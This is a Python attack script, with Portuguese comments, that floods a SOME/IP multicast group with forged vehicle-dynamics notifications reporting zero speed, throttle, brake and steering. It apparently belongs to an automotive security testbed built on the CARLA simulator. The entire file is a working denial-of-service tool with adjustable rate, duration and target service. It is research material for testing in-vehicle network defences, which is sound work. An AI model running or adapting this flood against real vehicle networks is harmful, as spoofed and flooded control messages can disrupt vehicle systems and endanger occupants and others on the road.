"""
DoS — flood de notificacoes SOME/IP acima da frequencia esperada.
Analogo ao denial_of_service.py do yes-carla-can (CAN).
"""

import socket
import time
import random

from someip_network.packet import SomeIPPacket
from someip_network import SERVICE_DYNAMICS, METHOD_NOTIFY
from someip_network.network import MULTICAST_GROUP, MULTICAST_PORT


def run(target_service=SERVICE_DYNAMICS, rate_hz=500, duration_s=30):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    interval = 1.0 / rate_hz
    deadline = time.time() + duration_s
    session  = 0
    sent     = 0

    print(f'[DoS] Flood Service 0x{target_service:04X} @ {rate_hz}Hz por {duration_s}s')

    while time.time() < deadline:
        session = (session % 0xFFFF) + 1
        payload = b'{"velocidade_kmh":0,"throttle":0,"brake":0,"steering":0}'
        pkt = SomeIPPacket(
            service_id = target_service,
            method_id  = METHOD_NOTIFY,
            session_id = session,
            payload    = payload,
        )
        sock.sendto(pkt.encode(), (MULTICAST_GROUP, MULTICAST_PORT))
        sent += 1
        time.sleep(interval)

    sock.close()
    print(f'[DoS] Encerrado — {sent} pacotes enviados')


if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('--rate',     type=int,   default=500,  help='Hz de flood')
    p.add_argument('--duration', type=int,   default=30,   help='Segundos')
    p.add_argument('--service',  type=lambda x: int(x,16), default=0x1001)
    args = p.parse_args()
    run(args.service, args.rate, args.duration)
